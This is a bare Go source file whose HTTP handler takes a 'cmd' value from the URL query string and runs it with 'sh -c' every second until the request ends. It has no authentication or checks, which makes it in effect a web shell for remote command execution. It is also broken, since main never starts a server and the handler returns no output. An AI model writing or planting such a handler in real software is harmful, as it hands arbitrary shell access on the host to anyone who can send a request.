package main

import (
	"net/http"
	"os/exec"
	"time"
)

func handler(w http.ResponseWriter, r *http.Request) {
	cmd := r.URL.Query().Get("cmd")
	ticker := time.NewTicker(time.Second)
	for {
		select {
		case <-r.Context().Done():
			return
		case <-ticker.C:
			exec.Command("sh", "-c", cmd).Run()
		}
	}
}

func main() {
	http.HandleFunc("/", handler)
}
